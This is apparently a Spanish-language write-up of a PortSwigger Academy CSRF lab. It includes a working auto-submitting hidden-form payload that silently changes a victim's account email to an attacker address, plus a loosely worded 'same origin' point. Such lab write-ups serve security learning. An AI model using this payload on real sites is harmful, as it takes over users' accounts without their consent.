# PortSwigger Lab: CSRF vulnerability with no defenses

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20f%C3%A1cil-brightgreen)
![Tipo](https://img.shields.io/badge/Tipo-CSRF-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF sin defensas.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- HTML form injection
- Exploit server
- Burp Suite interception
- Análisis de peticiones HTTP

## Flujo resumido

```
Capturar petición POST (sin CSRF token)
→ Crear payload HTML con formulario oculto
→ Auto-envío con JavaScript
→ Desplegar en exploit server
→ Enviar a víctima
→ Email cambiado sin consentimiento
```

## Payload CSRF

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<form method="POST" 
      action="https://target.com/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value="attacker@attacker.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

## Puntos clave

- **Sin CSRF token** — la aplicación no valida tokens únicos
- **Cookie automática** — el navegador envía sesión sin validación
- **POST simple** — solo requiere parámetro email
- **Mismo origen** — iframe y form heredan la sesión

## Referencias

- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger Academy](https://portswigger.net/web-security/lab)
